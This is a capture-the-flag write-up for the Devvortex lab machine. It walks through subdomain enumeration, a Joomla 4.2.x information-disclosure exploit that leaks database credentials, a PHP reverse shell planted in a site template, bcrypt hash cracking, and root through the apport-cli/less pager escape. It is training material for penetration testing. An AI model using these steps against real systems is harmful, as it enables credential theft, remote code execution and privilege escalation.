# Devvortex

## Information Gathering

- 80/tcp
    - domains
        - http://devvortex.htb
        - http://dev.devvortex.htb
            - running joomla version 4.2.6
- credentials
    - joomla administrator portal `http://dev.devvortex.htb/administrator`
        - lewis:P4ntherg0t1n5r3c0n##
    - foothold onto box
        - logan:tequieromucho


## Enumeration

nmap scan
```bash
$ sudo nmap -p 22,80 -A 10.10.11.242 -oN nmap/all.nmap           
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-20 15:46 EST
Nmap scan report for 10.10.11.242
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### 22/tcp
### 80/tcp

- Banner grabbing
```bash
$ curl -I "http://devvortex.htb/"
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 20 Jan 2024 20:52:55 GMT
Content-Type: text/html
Content-Length: 18048
Last-Modified: Tue, 12 Sep 2023 17:45:54 GMT
Connection: keep-alive
ETag: "6500a3d2-4680"
Accept-Ranges: bytes
```

- There is a hostname for 10.10.11.242
    - `http://devvortex.htb/`

- Attempting subdomain enumeration
```bash
ffuf -c -w SecLists/Discovery/DNS/subdomain-top1million-5000.txt -u "http://devvortex.htb" -H "Host: FUZZ.devvortex.htb" -o devvortext_subdomain_enum.json
cat devvortext_subdomain_enum.json | jq '.results[].status' | sort -u
    200
    302
cat devvortext_subdomain_enum.json | jq '.results[] | select(.status == 200)'
{
  "input": {
    "FFUFHASH": "7ad0c13",
    "FUZZ": "dev"
  },
  "position": 19,
  "status": 200,
  "length": 23221,
  "words": 5081,
  "lines": 502,
  "content-type": "text/html; charset=utf-8",
  "redirectlocation": "",
  "scraper": {},
  "duration": 120098908,
  "resultfile": "",
  "url": "http://devvortex.htb",
  "host": "dev.devvortex.htb"
}
```

- Adding `dev.devvortex.htb` to my `/etc/hosts` file and performing a banner grab:
```bash
$ curl -I "http://dev.devvortex.htb"                                           
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 23 Jan 2024 00:40:10 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: 1daf6e3366587cf9ab315f8ef3b5ed78=j9ujp58ve7vi5dadvjerkp1i62; path=/; HttpOnly
x-frame-options: SAMEORIGIN
referrer-policy: strict-origin-when-cross-origin
cross-origin-opener-policy: same-origin
Expires: Wed, 17 Aug 2005 00:00:00 GMT
Last-Modified: Tue, 23 Jan 2024 00:40:10 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
```

- Directory busting `http://dev.devvortex.htb`
```bash
gobuster dir -u "http://dev.devvortex.htb/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x html,txt,js,php -o gob/dev.devvortext-root.gob
```

- Viewing `http://dev.devvortex.htb/README.txt` shows that this is a Joomla CMS. Somewhere in the `4.2` version range
- I'll use joomscan for cms enumeration:
```bash
joomscan -u "http://dev.devvortex.htb"
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 4.2.6

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page : http://dev.devvortex.htb/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://dev.devvortex.htb/robots.txt 

Interesting path found from robots.txt
http://dev.devvortex.htb/joomla/administrator/
http://dev.devvortex.htb/administrator/
http://dev.devvortex.htb/api/
http://dev.devvortex.htb/bin/
http://dev.devvortex.htb/cache/
http://dev.devvortex.htb/cli/
http://dev.devvortex.htb/components/
http://dev.devvortex.htb/includes/
http://dev.devvortex.htb/installation/
http://dev.devvortex.htb/language/
http://dev.devvortex.htb/layouts/
http://dev.devvortex.htb/libraries/
http://dev.devvortex.htb/logs/
http://dev.devvortex.htb/modules/
http://dev.devvortex.htb/plugins/
http://dev.devvortex.htb/tmp/


[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/dev.devvortex.htb/
```

The web application is using Joomla 4.2.6. We can verify this by navigating to `http://dev.devvortex.htb/administrator/manifests/files/joomla.xml` which does show `4.2.6`

- publicly disclosed vulnerabilities
    - [Joomla 4.2.8 Unauthenticated Information Disclosure](https://www.exploit-db.com/exploits/51334)
- extensions
- templates
- users
- directory indexing




## Foothold

### Shell as www-data

- Lets start with using the Joomla 4.2.8 Unauthenticated Information Disclosure CVE:
```s
ruby joomla_4.2.8_info_disclosure.rb "http://dev.devvortex.htb"
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

- With the credentials: `lewis:P4ntherg0t1n5r3c0n##` I can authenticate to `http://dev.devvortex.htb/administrator`
- With site administrator privileges, I'll modify the template in use to execute php code and get me a reverse shell
- Navigating to the templates > Cassiopeia > offline.php
    - I actually couldn't find the templates so I had to update the dashboard to display the `Template Code` option
    - After navigating to offline.php, I slapped in the pentesting monkey's php reverse shell and change the ip and port
    - saved
- Starting a listener and navigating to `http://dev.devvortex.htb/templates/cassiopeia/offline.php` got me a reverse shell

### Pivot to logan

- After dropping onto the box, I checked the joomla database
```bash
# password: P4ntherg0t1n5r3c0n##
mysql -h 127.0.0.1 -u lewis -p 
mysql> use joomla;
mysql> select * from sd4fg_users;

username | email | password | ...
logan | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 ...
```

Running JtR agains the dumped hash:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt logan_password.txt

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tequieromucho    (?)     
1g 0:00:00:03 DONE (2024-01-22 20:41) 0.3030g/s 436.3p/s 436.3c/s 436.3C/s lacoste..michel
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Gets us access as logan with the credentials `logan:tequieromucho`

## Privilege Escalation

Running `sudo -l`
```bash
$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

`apport-cli` has a very gtfobin cve associated with it [here](https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e00). Whhen filing a bug with:
```bash
sudo /user/bin/apport-cli --file-bug
```
`apport-cli` will use `less` as the pager. `less` has a known privilege escalation vector where, after dropping into the pager environment an attacker can type `!/bin/sh` which breaks out of the pager and spawns a /bin/sh shell. This gets you root.